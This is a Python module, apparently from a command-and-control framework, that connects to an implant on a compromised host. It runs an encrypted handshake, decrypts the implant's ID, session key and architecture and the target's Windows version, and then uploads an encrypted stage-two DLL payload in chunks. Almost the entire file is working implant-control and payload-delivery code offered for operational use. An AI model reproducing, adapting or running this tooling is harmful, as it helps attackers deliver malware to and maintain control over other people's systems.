import eternalhush as eh
from additional.clingyspider import const
from additional.clingyspider import structs
from additional.clingyspider import __on_ready_callback
import os
import tempfile
def read_rsa_pkey(key_path):
    keyset = eh.ui.QueryKeyStorage()
    for ke in keyset:
        if ke['name'] == key_path:
            private_key = bytes.fromhex(ke['data2'])
            #if public_key[0:4] == RSA_MAGIC.to_bytes(eh.LONG, "big"):
            return private_key
    eh.ui.Echo(f"Key '{key_path}' not exists in keystorage", eh.ECHO_ERROR)

def main(args):
    if(not args.relock and eh.ui.GetEnv("MIBA_CONNECTION") != ""):
        eh.ui.Echo("The session is already set up", eh.ECHO_ERROR)
        return
    tcp_connection = eh.net.NewConnection(args.host, args.port, eh.TCP_CONNECTION)
    if tcp_connection == None:
        eh.ui.Echo("Failed to open direct TCP connection to " + args.host + ":" + str(args.port), eh.ECHO_ERROR)
        return
    eh.ui.Echo("Opened direct TCP connection to " + args.host + ":" + str(args.port), eh.ECHO_DEFAULT)
    hello_request = eh.data.Struct(structs.HELLO_REQUEST)
    
    eh.ui.Echo("STAGE 1 - Negotiation", eh.ECHO_WARNING)
    hello_request.val1 = const.MAGIC_VAL1
    hello_request.val2 = const.MAGIC_VAL2
    hello_request.inital_data = bytearray(os.urandom(248))

    eh.net.TcpSend(tcp_connection, hello_request.data())
    eh.ui.Echo("Sended Hello request", eh.ECHO_DEFAULT)
    
    hello_response = eh.data.Struct(structs.HELLO_RESPONSE)
    resp = eh.net.TcpRecv(tcp_connection, len(hello_response))

    if not resp:
        eh.ui.Echo("Invalid data received", eh.ECHO_ERROR)
        return
    eh.ui.Echo("Received Hello response", eh.ECHO_DEFAULT)
    hello_response.from_bytes(resp)
    
    eh.ui.Echo("Decrypting implant info with privatekey", eh.ECHO_DEFAULT)
    k = read_rsa_pkey(args.key)
    key = eh.crypto.ImportRsaKey(k, eh.PRIVATE_KEY)
    #print(keypath)
    if not key:
        eh.ui.Echo("Invalid RSA private key specified", eh.ECHO_ERROR)
        return
    decrypted_implant_info = eh.crypto.DecryptRsaData(key, bytes(hello_response.implant_info))

    implant_info = eh.data.Struct(structs.IMPLANT_INFO)
    implant_info.from_bytes(decrypted_implant_info)

    eh.ui.Echo("Implant version: " + bytes(implant_info.implant_version)[::-1].hex(), eh.ECHO_DEFAULT)
    eh.ui.SetEnv("MIBA_VERSION", bytes(implant_info.implant_version)[::-1].hex())

    eh.ui.Echo("Implant id: " +  str(int(implant_info.implant_id)), eh.ECHO_DEFAULT)
    eh.ui.SetEnv("MIBA_ID", str(int(implant_info.implant_id)))
  
    eh.ui.Echo("Implant session key: " + bytes(implant_info.session_key).hex(), eh.ECHO_DEFAULT)
    eh.ui.SetEnv("MIBA_KEY", bytes(implant_info.session_key).hex())

    eh.ui.Echo("IV key: " + bytes(hello_response.next_iv).hex(), eh.ECHO_DEFAULT)
    eh.ui.SetEnv("MIBA_IV", bytes(hello_response.next_iv).hex())

    if(int.from_bytes(implant_info.implant_arch.get(), "little") == const.X64_ARCH):
        eh.ui.Echo("Implant architecture: X64", eh.ECHO_DEFAULT)
        eh.ui.SetEnv("MIBA_ARCH", "X64")
    else:
        eh.ui.Echo("Implant architecture: X32", eh.ECHO_DEFAULT)
        eh.ui.SetEnv("MIBA_ARCH", "X32")
        
    if(int.from_bytes(implant_info.platform_arch.get(), "little") == const.X64_ARCH):
        eh.ui.Echo("Platform architecture: X64", eh.ECHO_DEFAULT)
        eh.ui.SetEnv("PLATFORM_ARCH", "X64")
    else:
        eh.ui.Echo("Platform architecture: X32", eh.ECHO_DEFAULT)
        eh.ui.SetEnv("PLATFORM_ARCH", "X32")
    eh.ui.Echo("Implant platform: " + implant_info.implant_platform.get().hex(), eh.ECHO_DEFAULT)
    
    nt_major = implant_info.nt_major.get(int)
    nt_minor = implant_info.nt_minor.get(int)
    build_major = implant_info.buildno_major.get(int)
    build_minor = implant_info.buildno_minor.get(int)
    eh.ui.Echo("NT VERSION: {}.{} {}.{}".format(nt_major, nt_minor, build_major, build_minor), eh.ECHO_DEFAULT)
    eh.ui.SetEnv("NTOS_MAJOR", nt_major)
    eh.ui.SetEnv("NTOS_MINOR", nt_minor)
    eh.ui.SetEnv("BUILDNO_MAJOR", build_major)
    eh.ui.SetEnv("BUILDNO_MINOR", build_minor)

    eh.ui.Echo("STAGE 2 - Sending base", eh.ECHO_WARNING)
    if not send_base(tcp_connection, implant_info.session_key.get(), hello_response.next_iv.get()):
        return

    eh.ui.SetHostname(args.host)
    if eh.ui.GetLockedModule() != "":
        eh.ui.UnlockModule()
    eh.ui.LockModule("clsp")
    eh.ui.SetEnv("MIBA_CONNECTION", tcp_connection)
    eh.ui.SetEnv("MIBA_CONNECTION_TYPE", "bind_tcp")
    
    if args.nosurvey:
        eh.ui.SetEnv("MIBA_SURVEY_RUN", "false")
    else:
        eh.ui.SetEnv("MIBA_SURVEY_RUN", "true")

    if args.survey_rescan == None:
        eh.ui.SetEnv("MIBA_SURVEY_RESCAN_TARGET", 'ask')
    elif args.survey_rescan.lower() == 'yes':
        eh.ui.SetEnv("MIBA_SURVEY_RESCAN_TARGET", 'true')
    elif args.survey_rescan.lower() == 'no':
        eh.ui.SetEnv("MIBA_SURVEY_RESCAN_TARGET", 'false')
    else:
        eh.ui.Echo(f"Unkown argument '-survey_rescan' value '{args.survey_rescan}', switching to 'yes'", eh.ECHO_WARNING)
        eh.ui.SetEnv("MIBA_SURVEY_RESCAN_TARGET", 'true')
    __on_ready_callback.ClingyspiderDefaultCallback(eh.CONSOLE_ID)


def send_base(conn, key, iv):
    try:
       with open(os.path.join(eh.FILEDIR, eh.ui.GetEnv("PLATFORM_ARCH")+"_ClSp_Base_Dll.dll"), "rb") as f:
            content = f.read()
            content = bytearray(content)
    except IOError:
        eh.ui.Echo("Error while opening the file", eh.ECHO_ERROR)
        return False 
        
    encrypted_content = eh.crypto.EncryptAesData(key, iv, content)
    payload_part_list = list()
    for i in range(0, len(encrypted_content), 4096):
        payload_part_list.append(encrypted_content[i:i+4096])
    
    plinfo = eh.data.Struct(structs.PAYLOADINFO)
    plinfo.payload_size = len(content)
    
    encrypted_payload_info = eh.crypto.EncryptAesData(key, iv, plinfo.data())
    eh.net.TcpSend(conn, encrypted_payload_info)

    for i in range(len(payload_part_list)):
        eh.net.TcpSend(conn, payload_part_list[i])

    return True



